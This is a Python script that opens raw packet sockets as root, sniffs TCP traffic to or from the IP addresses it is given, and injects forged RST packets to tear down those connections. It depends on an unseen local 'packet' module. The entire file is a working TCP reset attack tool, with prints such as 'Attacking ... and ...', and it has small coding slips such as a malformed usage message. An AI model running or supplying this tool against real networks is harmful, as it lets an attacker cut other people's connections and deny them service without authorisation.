#!/usr/bin/env python3
import threading
import socket
from packet import EthernetFrame
from sys import exit, argv
from os import getuid
from time import time, sleep

if getuid() != 0:
    print("This script must be run as root so it can capture traffic.")
    exit(1)

if len(argv) < 3:
    print("Usage: {} <iface> <addresses> ...", argv[0])
    exit(1)

iface, *addresses = argv[1:]

attack_event = threading.Event()
attack_targets = []
attack_targets_lock = threading.Lock()

we_are = {"done here": False}


def listen():
    listen_socket = socket.socket(
        socket.AF_PACKET,
        socket.SOCK_RAW,
        socket.ntohs(0x0003)
    )

    while True:
        if we_are["done here"]:
            break

        try:
            frame = EthernetFrame(listen_socket.recv(65535))
        except ValueError:
            continue
        except socket.SocketError:
            # break
            raise

        ip = frame.payload
        tcp = ip.payload

        # ignore reset packets
        if tcp.RST:
            continue

        sender = str(ip.source_address)
        receiver = str(ip.dest_address)

        if sender not in addresses and receiver not in addresses:
            continue

        with attack_targets_lock:
            attack_targets.append(frame)
        attack_event.set()

    listen_socket.close()


def attack():
    attack_socket = socket.socket(
        socket.AF_PACKET,
        socket.SOCK_RAW,
        socket.ntohs(0x0003)
    )

    attack_socket.bind((iface, 0))

    print("Watching for connections to interrupt. Press Ctrl-C to stop.")

    while True:
        attack_event.wait()

        if we_are["done here"]:
            break

        while attack_targets:
            with attack_targets_lock:
                target = attack_targets.pop(0)

            print("Attacking {} and {}.".format(
                target.payload.source_address,
                target.payload.dest_address
            ))

            target.payload.payload.forge_reset()
            attack_socket.send(target.raw())

        attack_event.clear()

    attack_socket.close()


listen_thread = threading.Thread(target=listen, name="listen", daemon=True)
listen_thread.start()
attack_thread = threading.Thread(target=attack, name="attack", daemon=True)
attack_thread.start()

try:
    while True:
        sleep(30)
except KeyboardInterrupt:
    we_are["done here"] = True
